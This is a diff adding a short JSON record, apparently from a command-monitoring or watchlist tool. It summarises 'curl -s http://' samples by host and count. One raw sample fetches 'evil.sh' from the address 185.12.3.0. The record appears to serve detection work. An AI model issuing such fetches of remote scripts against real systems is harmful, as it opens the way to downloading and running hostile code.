@@ -1,0 +1,16 @@
+{
+ "curl -s http://": {
+  "samples": 2,
+  "watchlist_hits": 0,
+  "top_hosts": [
+   [
+    "185.12.3.0",
+    2
+   ]
+  ],
+  "raw": [
+   "185.12.3.0/metrics; echo \"exit=$?\"",
+   "185.12.3.0/evil.sh 2>&1 | head -100"
+  ]
+ }
+}
